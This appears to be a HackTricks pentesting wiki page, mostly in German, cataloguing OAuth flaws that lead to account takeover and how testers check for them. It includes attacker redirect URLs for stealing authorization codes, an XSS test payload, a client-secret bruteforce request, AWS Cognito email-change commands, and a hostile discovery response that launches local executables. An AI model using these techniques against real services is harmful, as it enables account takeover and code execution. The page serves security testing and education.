# OAuth to Account takeover

{{#include ../banners/hacktricks-training.md}}

## Basic Information <a href="#d4a8" id="d4a8"></a>

OAuth offers various versions, with foundational insights accessible at [OAuth 2.0 documentation](https://oauth.net/2/). This discussion primarily centers on the widely used [OAuth 2.0 authorization code grant type](https://oauth.net/2/grant-types/authorization-code/), providing an **authorization framework that enables an application to access or perform actions on a user's account in another application** (the authorization server).

Betrachte eine hypothetische Website _**https://example.com**_, die dazu gedacht ist, **alle deine Social-Media-Beiträge anzuzeigen**, einschließlich privater. Dafür wird OAuth 2.0 verwendet. _https://example.com_ wird um deine Erlaubnis bitten, **auf deine Social-Media-Beiträge zuzugreifen**. Infolgedessen erscheint auf _https://socialmedia.com_ ein Zustimmungsbildschirm, der die **angeforderten Berechtigungen und den anfragenden Entwickler** auflistet. Nach deiner Autorisierung erhält _https://example.com_ die Möglichkeit, **deine Beiträge in deinem Namen zuzugreifen**.

Es ist wichtig, die folgenden Komponenten im OAuth 2.0-Framework zu verstehen:

- **resource owner**: Du, als **Benutzer/Entität**, erteilst den Zugriff auf deine Ressource, z. B. die Beiträge deines Social-Media-Accounts.
- **resource server**: Der **Server, der authentifizierte Anfragen verwaltet**, nachdem die Anwendung im Namen des `resource owner` ein `access token` erhalten hat, z. B. **https://socialmedia.com**.
- **client application**: Die **Anwendung, die Autorisierung vom `resource owner` anfordert**, wie **https://example.com**.
- **authorization server**: Der **Server, der `access tokens` an die `client application` ausgibt**, nachdem der `resource owner` erfolgreich authentifiziert wurde und die Autorisierung erteilt ist, z. B. **https://socialmedia.com**.
- **client_id**: Ein öffentlicher, eindeutiger Bezeichner für die Anwendung.
- **client_secret:** Ein geheimer Schlüssel, der nur der Anwendung und dem authorization server bekannt ist und zur Erzeugung von `access_tokens` verwendet wird.
- **response_type**: Ein Wert, der angibt, **welcher Token-Typ angefordert wird**, z. B. `code`.
- **scope**: Der **Zugriffsumfang**, den die `client application` vom `resource owner` anfordert.
- **redirect_uri**: Die **URL, auf die der Benutzer nach der Autorisierung weitergeleitet wird**. Diese muss typischerweise mit der vorregistrierten Redirect-URL übereinstimmen.
- **state**: Ein Parameter, um **Daten während der Weiterleitung des Benutzers zum und vom authorization server beizubehalten**. Seine Einzigartigkeit ist kritisch, da er als **CSRF-Schutzmechanismus** dient.
- **grant_type**: Ein Parameter, der **den grant type und die Art des zurückzugebenden Tokens** angibt.
- **code**: Der Autorisierungscode vom `authorization server`, der zusammen mit `client_id` und `client_secret` von der client application verwendet wird, um ein `access_token` zu erhalten.
- **access_token**: Der **Token, den die client application für API-Anfragen** im Namen des `resource owner` verwendet.
- **refresh_token**: Ermöglicht der Anwendung, **ein neues `access_token` zu erhalten, ohne den Benutzer erneut auffordern zu müssen**.

### Flow

Der **tatsächliche OAuth-Flow** verläuft wie folgt:

1. Du rufst [https://example.com](https://example.com) auf und klickst den Button „Mit Social Media integrieren“.
2. Die Seite sendet dann eine Anfrage an [https://socialmedia.com](https://socialmedia.com), um deine Autorisierung zu erhalten, damit die Anwendung von https://example.com auf deine Beiträge zugreifen kann. Die Anfrage ist wie folgt aufgebaut:
```
https://socialmedia.com/auth
?response_type=code
&client_id=example_clientId
&redirect_uri=https%3A%2F%2Fexample.com%2Fcallback
&scope=readPosts
&state=randomString123
```
3. Ihnen wird anschließend eine Zustimmungsseite angezeigt.
4. Nach Ihrer Zustimmung sendet Social Media eine Antwort an die `redirect_uri` mit den Parametern `code` und `state`:
```
https://example.com?code=uniqueCode123&state=randomString123
```
5. https://example.com nutzt diesen `code` zusammen mit seinem `client_id` und `client_secret`, um serverseitig eine Anfrage zu stellen, um in deinem Namen ein `access_token` zu erhalten, das den Zugriff auf die Berechtigungen ermöglicht, denen du zugestimmt hast:
```
POST /oauth/access_token
Host: socialmedia.com
...{"client_id": "example_clientId", "client_secret": "example_clientSecret", "code": "uniqueCode123", "grant_type": "authorization_code"}
```
6. Schließlich endet der Prozess damit, dass https://example.com Ihr `access_token` verwendet, um einen API-Aufruf an Social Media zu machen, um Zugriff zu erhalten

## Vulnerabilities <a href="#id-323a" id="id-323a"></a>

### Open redirect_uri <a href="#cc36" id="cc36"></a>

Per [RFC 6749 §3.1.2](https://www.rfc-editor.org/rfc/rfc6749#section-3.1.2), der authorization server muss den Browser nur zu **vorausregistrierten, exakten redirect URIs** weiterleiten. Jede Schwäche hier erlaubt es einem Angreifer, ein Opfer über eine bösartige Authorization-URL zu schicken, sodass der IdP den `code` (und `state`) des Opfers direkt an einen Angreifer-Endpunkt liefert, der ihn dann einlösen und Tokens erbeuten kann.

Typischer Angriffsablauf:

1. Craft `https://idp.example/auth?...&redirect_uri=https://attacker.tld/callback` und sende ihn an das Opfer.
2. Das Opfer authentifiziert sich und genehmigt die Scopes.
3. Der IdP leitet weiter zu `attacker.tld/callback?code=<victim-code>&state=...`, wo der Angreifer die Anfrage protokolliert und den Code sofort austauscht.

Häufige Validierungsfehler, die geprüft werden sollten:

- **Keine Validierung** – jede absolute URL wird akzeptiert, was zu sofortigem Diebstahl des `code` führt.
- **Schwache Substring-/Regex-Prüfungen des Hosts** – umgehbar mit ähnlichen Domains wie `evilmatch.com`, `match.com.evil.com`, `match.com.mx`, `matchAmatch.com`, `evil.com#match.com` oder `match.com@evil.com`.
- **IDN homograph mismatches** – die Validierung erfolgt an der punycode-Form (`xn--`), aber der Browser leitet zur Unicode-Domain weiter, die vom Angreifer kontrolliert wird.
- **Beliebige Pfade auf einem erlaubten Host** – das Setzen von `redirect_uri` auf `/openredirect?next=https://attacker.tld` oder auf irgendeinen XSS/user-content-Endpunkt leaks the `code` entweder durch verkettete Redirects, Referer-Header oder injiziertes JavaScript.
- **Verzeichnis-Beschränkungen ohne Normalisierung** – Muster wie `/oauth/*` können mit `/oauth/../anything` umgangen werden.
- **Wildcard-Subdomains** – das Akzeptieren von `*.example.com` bedeutet, dass jede Übernahme (dangling DNS, S3 bucket, etc.) sofort einen gültigen Callback ergibt.
- **Nicht-HTTPS-Callbacks** – das Durchlassen von `http://`-URIs ermöglicht Netzwerkangreifern (Wi‑Fi, Corporate-Proxy), den `code` während der Übertragung abzufangen.

Überprüfen Sie auch Hilfs-Redirect-Parameter (`client_uri`, `policy_uri`, `tos_uri`, `initiate_login_uri`, etc.) und das OpenID discovery document (`/.well-known/openid-configuration`) auf zusätzliche Endpunkte, die dieselben Validierungsfehler erben könnten.

### XSS in redirect implementation <a href="#bda5" id="bda5"></a>

Wie in diesem Bug-Bounty-Report [https://blog.dixitaditya.com/2021/11/19/account-takeover-chain.html](https://blog.dixitaditya.com/2021/11/19/account-takeover-chain.html) erwähnt, kann es möglich sein, dass die Redirect **URL in der Antwort** des Servers nach der Authentifizierung des Benutzers reflektiert wird und somit **für XSS verwundbar** ist. Mögliche Payload zum Testen:
```
https://app.victim.com/login?redirectUrl=https://app.victim.com/dashboard</script><h1>test</h1>
```
### CSRF - Unsachgemäße Handhabung des `state`-Parameters <a href="#bda5" id="bda5"></a>

Der `state`-Parameter ist das Authorization Code flow CSRF-Token: der Client muss pro Browser-Instanz einen kryptographisch zufälligen Wert erzeugen, ihn an einem Ort speichern, den nur dieser Browser lesen kann (Cookie, local storage, etc.), ihn in der Authorization-Anfrage senden und jede Antwort ablehnen, die nicht denselben Wert zurückliefert. Wenn der Wert statisch, vorhersagbar, optional oder nicht an die Benutzersession gebunden ist, kann der Angreifer seinen eigenen OAuth-Flow abschließen, die finale `?code=`-Anfrage abfangen (ohne sie zu senden) und später den Browser eines Opfers dazu zwingen, diese Anfrage zu replayen, sodass das Konto des Opfers mit dem Identity-Provider-Profil des Angreifers verknüpft wird.

Das Replay-Muster ist immer dasselbe:

1. Der Angreifer authentifiziert sich beim IdP mit seinem Account und fängt die letzte Redirect-URL ab, die `code` (und ggf. `state`) enthält.
2. Er verwirft diese Anfrage, behält die URL und missbraucht später ein beliebiges CSRF-Primitiv (Link, iframe, automatisch absendendes Formular), um den Browser des Opfers zum Laden zu zwingen.
3. Wenn der Client `state` nicht durchsetzt, verarbeitet die Anwendung das Autorisierungsergebnis des Angreifers und loggt den Angreifer in das App-Konto des Opfers ein.

Praktische Checkliste für den Umgang mit `state` während Tests:

- **Völlig fehlender `state`** – wenn der Parameter nie erscheint, ist das komplette Login CSRF-angreifbar.
- **`state` nicht erforderlich** – entferne ihn aus der Initialanfrage; wenn der IdP trotzdem Codes ausstellt, die der Client annimmt, ist die Abwehr opt-in.
- **Zurückgelieferter `state` wird nicht validiert** – manipuliere den Wert in der Antwort (Burp, MITM proxy). Das Akzeptieren nicht übereinstimmender Werte bedeutet, dass das gespeicherte Token nie verglichen wird.
- **Vorhersagbarer oder rein datengetriebener `state`** – viele Apps packen Redirect-Pfade oder JSON-Blobs in `state`, ohne Randomness beizumischen, wodurch Angreifer gültige Werte erraten und Flows replayen können. Immer starke Entropie voran- oder anhängen, bevor Daten encodiert werden.
- **`state`-Fixierung** – wenn die App Nutzern erlaubt, den `state`-Wert zu liefern (z. B. über manipulierte authorization URLs) und ihn im Flow wiederverwendet, kann ein Angreifer einen bekannten Wert fixieren und über mehrere Opfer wiederverwenden.

PKCE kann `state` ergänzen (insbesondere für public clients), indem der Authorization Code an einen code verifier gebunden wird, aber Web-Clients müssen trotzdem `state` verfolgen, um cross-user CSRF/Account-Linking-Bugs zu verhindern.

### Vor dem Account Takeover <a href="#ebe4" id="ebe4"></a>

1. **Ohne E-Mail-Verifizierung bei Kontoerstellung**: Angreifer können vorsorglich ein Konto mit der E-Mail des Opfers anlegen. Nutzt das Opfer später einen Drittanbieter-Service zum Login, könnte die Anwendung dieses Drittanbieter-Konto versehentlich mit dem vom Angreifer vorgefertigten Konto verknüpfen, was zu unautorisiertem Zugriff führt.
2. **Ausnutzung mangelnder OAuth-E-Mail-Verifizierung**: Angreifer können OAuth-Services ausnutzen, die E-Mails nicht verifizieren, indem sie sich registrieren und später die Account-E-Mail auf die des Opfers ändern. Diese Methode birgt ein ähnliches Risiko unautorisierten Kontozugriffs wie das erste Szenario, läuft aber über einen anderen Angriffsvektor.

### Offenlegung von Geheimnissen <a href="#e177" id="e177"></a>

Der `client_id` ist bewusst öffentlich, aber das **`client_secret` darf niemals für Endnutzer wiedergewinnbar sein**. Authorization Code-Deployments, die das Secret in **mobile APKs, desktop clients oder single-page apps** einbetten, übergeben diese Credentials effektiv an jeden, der das Paket herunterladen kann. Öffentliche Clients sollte man immer prüfen, indem man:

- das APK/IPA, Desktop-Installer oder die Electron-App entpackt und nach `client_secret`, Base64-Blobs, die zu JSON decodieren, oder hartkodierten OAuth-Endpunkten greppt.
- gebündelte Konfigurationsdateien (plist, JSON, XML) oder dekompilierte Strings auf Client-Credentials überprüft.

Hat der Angreifer das Secret extrahiert, muss er nur noch einen beliebigen Autorisierungs-`code` eines Opfers (via schwachem `redirect_uri`, Logs, etc.) stehlen, um unabhängig `/token` aufzurufen und access/refresh tokens zu minten, ohne die legitime App zu involvieren. Behandle public/native Clients als **nicht in der Lage, Secrets zu halten** — sie sollten stattdessen auf PKCE (RFC 7636) vertrauen, um Besitz eines pro-Instanz code verifier statt eines statischen Secrets zu beweisen. Prüfe während Tests, ob PKCE zwingend ist und ob das Backend Token-Exchanges tatsächlich ablehnt, die weder das `client_secret` **noch** einen gültigen `code_verifier` enthalten.

### Client Secret Bruteforce

Du kannst versuchen, das `client_secret` eines Service-Providers beim Identity Provider zu bruteforcen, um Konten zu stehlen.\
Die Anfrage zum BF könnte ähnlich aussehen:
```
POST /token HTTP/1.1
content-type: application/x-www-form-urlencoded
host: 10.10.10.10:3000
content-length: 135
Connection: close

code=77515&redirect_uri=http%3A%2F%2F10.10.10.10%3A3000%2Fcallback&grant_type=authorization_code&client_id=public_client_id&client_secret=[bruteforce]
```
### Referer/Header/Location-Artefakte leaking Code + State

Sobald der Client die **code and state** hat, und diese in **`location.href`** oder **`document.referrer`** auftauchen und an Dritte weitergeleitet werden, leak. Zwei wiederkehrende Muster:

- **Klassischer Referer leak**: nach dem OAuth-Redirect wird jede Navigation, die `?code=&state=` in der URL belässt, diese in den an CDNs/analytics/ads gesendeten **Referer**-Header schreiben.
- **Telemetry/analytics confused deputy**: einige SDKs (pixels/JS loggers) reagieren auf `postMessage`-Events und **senden dann das aktuelle `location.href`/`referrer` an Backend-APIs unter Verwendung eines im Message gelieferten Tokens**. Wenn du deinen eigenen Token in diesen Flow injizieren kannst (z. B. via einen von Angreifer kontrollierten postMessage-Relay), kannst du später die API-Request-History/Logs des SDKs auslesen und die in diesen Requests eingebetteten OAuth-Artefakte des Opfers wiederherstellen.


### Access Token im Browser-Verlauf gespeichert

Die zentrale Garantie des Authorization Code grant ist, dass **access tokens niemals den Browser des resource owners erreichen**. Wenn Implementierungen Tokens client-seitig leak, wird jeder kleine Bug (XSS, Referer leak, proxy logging) sofort zur Kontoübernahme. Prüfe immer auf:

- **Tokens in URLs** – wenn `access_token` im Query/Fragment erscheint, landet es im Browser-Verlauf, in Server-Logs, Analytics und in den an Dritte gesendeten Referer-Headern.
- **Tokens transiting untrusted middleboxes** – das Zurücksenden von Tokens über HTTP oder durch Debugging-/Corporate-Proxies erlaubt Netzwerkbeobachtern, sie direkt zu erfassen.
- **Tokens stored in JavaScript state** – React/Vue-Stores, globale Variablen oder serialisierte JSON-Blobs setzen Tokens jedem Script auf der Origin aus (einschließlich XSS-Payloads oder bösartiger Extensions).
- **Tokens persisted in Web Storage** – `localStorage`/`sessionStorage` behalten Tokens lange nach Logout auf gemeinsam genutzten Geräten und sind von Scripts zugreifbar.

Einer dieser Befunde hebt normalerweise sonst „low“-Bugs (wie ein CSP bypass oder DOM XSS) zu einer vollständigen API takeover, weil der Angreifer einfach das leaked bearer token auslesen und erneut verwenden kann.

### Ewiger Authorization Code

Authorization codes müssen **short-lived, single-use, and replay-aware** sein. Beim Bewerten eines Flows: erfasse einen `code` und:

- **Lebensdauer testen** – RFC 6749 empfiehlt Minuten, nicht Stunden. Versuche, den Code nach 5–10 Minuten einzulösen; wenn er noch funktioniert, ist das Exposure-Fenster für einen leaked code zu groß.
- **Sequenzielle Wiederverwendung testen** – sende denselben `code` zweimal. Wenn die zweite Anfrage ein weiteres Token liefert, können Angreifer Sessions beliebig klonen.
- **Gleichzeitige Einlösung/Race-Conditions testen** – starte zwei Token-Anfragen parallel (Burp intruder, turbo intruder). Schwache Issuer gewähren manchmal beide.
- **Replay-Handling beobachten** – ein Wiederverwendungsversuch sollte nicht nur fehlschlagen, sondern auch bereits aus diesem Code ausgestellte Tokens widerrufen. Andernfalls bleibt beim Erkennen eines Replays das erste Token des Angreifers aktiv.

Die Kombination eines replay-freundlichen Codes mit einer beliebigen `redirect_uri`- oder Logging-Schwachstelle ermöglicht persistierenden Konto-Zugriff selbst nachdem das Opfer den legitimen Login abgeschlossen hat.

### Authorization/Refresh Token nicht an Client gebunden

Wenn du den **authorization code** erhältst und ihn **für einen anderen client/app einlösen** kannst, kannst du andere Konten übernehmen. Teste auf schwache Bindung durch:

- Erfassen eines `code` für **app A** und dessen Senden an **app B’s token endpoint**; wenn du trotzdem ein Token erhältst, ist die Audience-Bindung gebrochen.
- Testen von first-party Token-Minting-Endpunkten, die eigentlich auf ihre eigenen Client-IDs beschränkt sein sollten; wenn sie beliebige `state`/`app_id` akzeptieren, während sie nur den Code validieren, führst du effektiv einen **authorization-code swap** aus, um höher privilegierte First-Party-Tokens zu minten.
- Überprüfen, ob die Client-Bindung nonce-/redirect URI-Mismatches ignoriert. Wenn eine Fehlerseite trotzdem SDKs lädt, die `location.href` protokollieren, kombiniere das mit Referer/telemetry leaks, um Codes zu stehlen und anderswo einzulösen.

Jeder Endpunkt, der `code` → token tauscht, **muss** den ausstellenden Client, die redirect URI und den nonce verifizieren; sonst kann ein gestohlener Code aus einer beliebigen App zu einem First-Party-Access-Token hochgestuft werden.

### Happy Paths, XSS, Iframes & Post Messages, um code & state Werte zu leak

[**Check this post**](https://labs.detectify.com/writeups/account-hijacking-using-dirty-dancing-in-sign-in-oauth-flows/#gadget-2-xss-on-sandbox-third-party-domain-that-gets-the-url)

### AWS Cognito <a href="#bda5" id="bda5"></a>

In diesem Bug-Bounty-Report: [**https://security.lauritz-holtmann.de/advisories/flickr-account-takeover/**](https://security.lauritz-holtmann.de/advisories/flickr-account-takeover/) siehst du, dass das **token**, das **AWS Cognito** an den Nutzer zurückgibt, möglicherweise **genügend Berechtigungen hat, um die Benutzerdaten zu überschreiben**. Daher könntest du, wenn du die **E-Mail eines Benutzers auf eine andere E-Mail ändern** kannst, möglicherweise Konten anderer übernehmen.
```bash
# Read info of the user
aws cognito-idp get-user --region us-east-1 --access-token eyJraWQiOiJPVj[...]

# Change email address
aws cognito-idp update-user-attributes --region us-east-1 --access-token eyJraWQ[...] --user-attributes Name=email,Value=imaginary@flickr.com
{
"CodeDeliveryDetailsList": [
{
"Destination": "i***@f***.com",
"DeliveryMedium": "EMAIL",
"AttributeName": "email"
}
]
}
```
Für detailliertere Informationen darüber, wie man AWS Cognito missbrauchen kann, siehe [AWS Cognito - Unauthenticated Enum Access](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-unauthenticated-enum-access/aws-cognito-unauthenticated-enum.html).

### Token anderer Apps missbrauchen <a href="#bda5" id="bda5"></a>

Wie in [**mentioned in this writeup**](https://salt.security/blog/oh-auth-abusing-oauth-to-take-over-millions-of-accounts) erwähnt, können OAuth-Flows, die den **token** (und nicht einen code) erwarten, verwundbar sein, wenn sie nicht prüfen, dass das **token** zur App gehört.

Dies liegt daran, dass ein Angreifer eine Anwendung erstellen könnte, die OAuth unterstützt und z. B. ein Login mit Facebook in seiner eigenen Anwendung ermöglicht. Sobald ein Opfer sich in der **Angreifers-Anwendung** mit Facebook einloggt, könnte der Angreifer das dem eigenen App zugewiesene **OAuth token des Nutzers** erhalten und dieses nutzen, um sich in der OAuth-Anwendung des Opfers mit dem token des Opfers anzumelden.

> [!CAUTION]
> Daher: Wenn es dem Angreifer gelingt, den Nutzer dazu zu bringen, Zugriff auf seine eigene OAuth-Anwendung zu gewähren, kann er das Konto des Opfers in Anwendungen übernehmen, die ein token erwarten und nicht prüfen, ob das token ihrer App-ID gewährt wurde.

### Two links & cookie <a href="#bda5" id="bda5"></a>

Laut [**diesem Writeup**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f) war es möglich, ein Opfer eine Seite öffnen zu lassen, deren **returnUrl** auf den Host des Angreifers zeigte. Diese Information würde in einem Cookie (RU) gespeichert und in einem späteren Schritt würde das **prompt** den **Nutzer** fragen, ob er diesem Host Zugriff gewähren möchte.

Um diese Abfrage zu umgehen, war es möglich, einen Tab zu öffnen, um den **Oauth flow** zu starten, der dieses RU-Cookie mittels der **returnUrl** setzt, den Tab zu schließen, bevor das Prompt angezeigt wird, und einen neuen Tab ohne diesen Wert zu öffnen. Dann informiert das **prompt** nicht über den Host des Angreifers, aber das Cookie wurde auf diesen gesetzt, sodass das **token** bei der Weiterleitung an den Host des Angreifers gesendet wird.

### Prompt Interaction Bypass <a href="#bda5" id="bda5"></a>

Wie in [**diesem Video**](https://www.youtube.com/watch?v=n9x7_J_a_7Q) erklärt, erlauben einige OAuth-Implementierungen, den GET-Parameter **`prompt`** auf None (**`&prompt=none`**) zu setzen, um zu verhindern, dass Nutzer im Web zur Bestätigung des angegebenen Zugriffs aufgefordert werden, wenn sie bereits auf der Plattform eingeloggt sind.

### response_mode

Wie [**in diesem Video erklärt**](https://www.youtube.com/watch?v=n9x7_J_a_7Q), kann es möglich sein, den Parameter **`response_mode`** anzugeben, um zu steuern, wo der code in der finalen URL bereitgestellt wird:

- `response_mode=query` -> Der code wird in einem GET-Parameter bereitgestellt: `?code=2397rf3gu93f`
- `response_mode=fragment` -> Der code wird im URL-Fragment bereitgestellt: `#code=2397rf3gu93f`
- `response_mode=form_post` -> Der code wird in einem POST-Formular geliefert, in einem input namens `code` mit dem entsprechenden Wert
- `response_mode=web_message` -> Der code wird in einer postMessage gesendet: `window.opener.postMessage({"code": "asdasdasd...`

### Clickjacking OAuth consent dialogs

OAuth consent/login dialogs sind ideale Clickjacking-Ziele: Wenn sie gerahmt werden können, kann ein Angreifer eigene Grafiken darüberlegen, die echten Buttons verbergen und Nutzer dazu bringen, gefährliche Scopes zu genehmigen oder Konten zu verknüpfen. Erstelle PoCs, die:

1. Die IdP-Authorization-URL innerhalb eines `<iframe sandbox="allow-forms allow-scripts allow-same-origin">` laden.
2. Mittels absoluter Positionierung/Opacity-Tricks gefälschte Buttons so ausrichten, dass sie mit den versteckten **Allow**/**Approve**-Steuerelementen übereinstimmen.
3. Optional Parameter (scopes, redirect URI) vorab ausfüllen, sodass die gestohlene Genehmigung dem Angreifer sofort nützt.

Während des Testens vergewissere dich, dass IdP-Seiten entweder `X-Frame-Options: DENY/SAMEORIGIN` oder eine restriktive `Content-Security-Policy: frame-ancestors 'none'` ausgeben. Falls keines von beiden vorhanden ist, demonstriere das Risiko mit Tools wie dem [NCC Group’s clickjacking PoC generator](https://github.com/nccgroup/clickjacking-poc) und dokumentiere, wie einfach ein Opfer die App des Angreifers autorisiert. Für zusätzliche Payload-Ideen siehe [Clickjacking](clickjacking.md).

### OAuth ROPC flow - 2 FA bypass <a href="#b440" id="b440"></a>

Laut [**diesem Blogpost**](https://cybxis.medium.com/a-bypass-on-gitlabs-login-email-verification-via-oauth-ropc-flow-e194242cad96) handelt es sich hierbei um einen OAuth-Flow, der das Login via **username** und **password** erlaubt. Wenn in diesem einfachen Flow ein **token** zurückgegeben wird, das Zugriff auf alle Aktionen des Nutzers gewährt, ist es möglich, 2FA mithilfe dieses tokens zu umgehen.

### ATO on web page redirecting based on open redirect to referrer <a href="#bda5" id="bda5"></a>

Dieser [**Blogpost**](https://blog.voorivex.team/oauth-non-happy-path-to-ato) beschreibt, wie ein **open redirect** auf den Wert des **referrer** missbraucht wurde, um OAuth zu ATO auszunutzen. Der Angriff war:

1. Das Opfer ruft die Webseite des Angreifers auf.
2. Das Opfer öffnet den bösartigen Link und ein opener startet den Google OAuth-Flow mit `response_type=id_token,code&prompt=none` als zusätzlichen Parametern und verwendet als **referrer** die Website des Angreifers.
3. Im Opener, nachdem der Provider das Opfer autorisiert hat, sendet er sie zurück an den Wert des `redirect_uri`-Parameters (die Webseite des Opfers) mit einem 30X-Redirect, der weiterhin die Website des Angreifers im referer behält.
4. Die Webseite des Opfers löst das open redirect basierend auf dem referrer aus und leitet den Nutzer zur Website des Angreifers weiter. Da der `response_type` `id_token,code` war, wird der code im Fragment der URL an den Angreifer gesendet, wodurch er das Konto des Nutzers via Google auf der Seite des Opfers übernehmen kann.

### SSRF-Parameter <a href="#bda5" id="bda5"></a>

[**Check this research**](https://portswigger.net/research/hidden-oauth-attack-vectors) **Für weitere Details zu dieser Technik.**

Dynamic Client Registration in OAuth stellt einen weniger offensichtlichen, aber kritischen Vektor für Sicherheitslücken dar, insbesondere für **Server-Side Request Forgery (SSRF)**-Angriffe. Dieser Endpunkt erlaubt es OAuth-Servern, Details über Client-Anwendungen zu empfangen, einschließlich sensibler URLs, die ausgenutzt werden könnten.

Wichtige Punkte:

- **Dynamic Client Registration** ist oft unter `/register` zu finden und akzeptiert Details wie `client_name`, `client_secret`, `redirect_uris` sowie URLs für Logos oder JSON Web Key Sets (JWKs) via POST.
- Dieses Feature entspricht den Spezifikationen in **RFC7591** und **OpenID Connect Registration 1.0**, welche Parameter beinhalten, die potenziell für SSRF anfällig sind.
- Der Registrierungsprozess kann Server unbeabsichtigt SSRF aussetzen, z. B. durch:
  - **`logo_uri`**: Eine URL für das Logo der Client-Anwendung, die vom Server abgerufen werden könnte und SSRF oder XSS nach sich ziehen kann, wenn die URL falsch behandelt wird.
  - **`jwks_uri`**: Eine URL zum JWK-Dokument des Clients, die, wenn bösartig gesetzt, den Server dazu bringen kann, ausgehende Requests an einen Angreifer-Server zu machen.
  - **`sector_identifier_uri`**: Verweist auf ein JSON-Array von `redirect_uris`, das der Server abrufen könnte und dadurch SSRF ermöglicht.
  - **`request_uris`**: Listet erlaubte request URIs für den Client auf, die ausgenutzt werden können, wenn der Server diese URIs beim Start der Authorization-Phase abruft.

Exploitation-Strategie:

- SSRF lässt sich auslösen, indem ein neuer Client mit bösartigen URLs in Parametern wie `logo_uri`, `jwks_uri` oder `sector_identifier_uri` registriert wird.
- Während direkte Ausnutzung über `request_uris` durch Whitelist-Kontrollen eingeschränkt sein kann, kann die Angabe einer vorregistrierten, vom Angreifer kontrollierten `request_uri` SSRF während der Authorization-Phase ermöglichen.

### OAuth/OIDC Discovery URL Abuse & OS Command Execution

Die Untersuchung zu [CVE-2025-6514](https://amlalabs.com/blog/oauth-cve-2025-6514/) (betroffen `mcp-remote`-Clients wie Claude Desktop, Cursor oder Windsurf) zeigt, wie **dynamische OAuth-Discovery zu einem RCE-Primitive** wird, wenn der Client IdP-Metadaten direkt an das Betriebssystem weiterreicht. Der entfernte MCP-Server liefert während des Discovery-Austauschs (`/.well-known/openid-configuration` oder beliebige Metadata-RPCs) einen vom Angreifer kontrollierten `authorization_endpoint`. `mcp-remote ≤0.1.15` rief dann den systemeigenen URL-Handler (`start`, `open`, `xdg-open` usw.) mit dem empfangenen String auf, sodass jedes vom OS unterstützte Scheme/Path lokal ausgeführt wurde.

Angriffsablauf

1. Weisen Sie den Desktop-Agenten auf einen feindlichen MCP/OAuth-Server (`npx mcp-remote https://evil`). Der Agent erhält `401` plus Metadaten.
2. Der Server antwortet mit JSON wie:
```
HTTP/1.1 200 OK
Content-Type: application/json

{
"authorization_endpoint": "file:/c:/windows/system32/calc.exe",
"token_endpoint": "https://evil/idp/token",
...
}
```
3. Der Client startet den OS-Handler für die übergebene URI. Windows akzeptiert Payloads wie `file:/c:/windows/system32/calc.exe /c"powershell -enc ..."`; macOS/Linux akzeptieren `file:///Applications/Calculator.app/...` oder sogar benutzerdefinierte Schemes wie `cmd://bash -lc '<payload>'`, falls registriert.
4. Da dies vor jeglicher Benutzerinteraktion geschieht, führt **allein das Konfigurieren des Clients, mit dem Angreifer-Server zu kommunizieren, zur Codeausführung**.

**Wie testen**

- Richte dich gegen jeden OAuth-fähigen Desktop/Agenten, der Discovery über HTTP(S) durchführt und zurückgegebene Endpunkte lokal öffnet (Electron apps, CLI helpers, thick clients).
- Intercepte oder hoste die Discovery-Antwort und ersetze `authorization_endpoint`, `device_authorization_endpoint` oder ähnliche Felder durch `file://`, `cmd://`, UNC-Pfade oder andere gefährliche Schemes.
- Prüfe, ob der Client das Scheme/den Host validiert. Fehlt die Validierung, führt das zu sofortiger Ausführung im Nutzerkontext und beweist die Schwachstelle.
- Wiederhole die Tests mit verschiedenen Schemes, um die gesamte Angriffsfläche zu kartieren (z. B. `ms-excel:`, `data:text/html,`, custom protocol handlers) und die plattformübergreifende Reichweite zu demonstrieren.

## OAuth providers Race Conditions

If the platform you are testing is an OAuth provider [**read this to test for possible Race Conditions**](race-condition.md).

## Mutable Claims Attack

In OAuth identifiziert das Feld sub einen Benutzer eindeutig, aber sein Format variiert je nach Authorization Server. Um die Benutzeridentifikation zu standardisieren, verwenden einige Clients E-Mail-Adressen oder User-Handles. Das ist jedoch riskant, weil:

- Manche Authorization Server nicht garantieren, dass diese Eigenschaften (wie das E-Mail-Feld) unveränderlich bleiben.
- In bestimmten Implementierungen — wie bei **"Login with Microsoft"** — verlässt sich der Client auf das E-Mail-Feld, das **vom Benutzer in Entra ID kontrolliert** und nicht verifiziert ist.
- Ein Angreifer kann dies ausnutzen, indem er eine eigene Azure AD-Organisation erstellt (z. B. doyensectestorg) und diese für einen Microsoft-Login verwendet.
- Obwohl die Object ID (gespeichert in sub) unveränderlich und sicher ist, kann die Abhängigkeit von einem veränderlichen E-Mail-Feld eine Account-Übernahme ermöglichen (z. B. das Kapern eines Accounts wie victim@gmail.com).

## Client Confusion Attack

Bei einem Client Confusion Attack verwendet eine Anwendung den OAuth Implicit Flow, verifiziert jedoch nicht, dass das finale Access Token speziell für ihre eigene Client ID erzeugt wurde. Ein Angreifer richtet eine öffentliche Website ein, die Googles OAuth Implicit Flow nutzt, lockt Tausende von Nutzern zum Einloggen und erntet so Access Tokens, die für die Seite des Angreifers gedacht sind. Haben diese Nutzer außerdem Konten auf einer anderen verwundbaren Website, die die Client ID des Tokens nicht validiert, kann der Angreifer die erbeuteten Tokens wiederverwenden, um die Opfer zu impersonifizieren und ihre Konten zu übernehmen.

## Scope Upgrade Attack

Der Authorization Code Grant setzt auf sichere Server-zu-Server-Kommunikation zur Übertragung von Benutzerdaten. Wenn der Authorization Server jedoch implizit einem scope-Parameter in der Access Token Request vertraut (ein Parameter, der nicht im RFC definiert ist), könnte eine bösartige Anwendung die Privilegien eines Authorization Codes durch Anforderung eines höheren Scopes erhöhen. Nachdem das Access Token generiert wurde, muss der Resource Server es verifizieren: Bei JWTs bedeutet das, die JWT-Signatur zu prüfen und Daten wie client_id und scope auszulesen; bei zufälligen String-Tokens muss der Server den Authorization Server abfragen, um die Token-Details zu erhalten.

## Redirect Scheme Hijacking

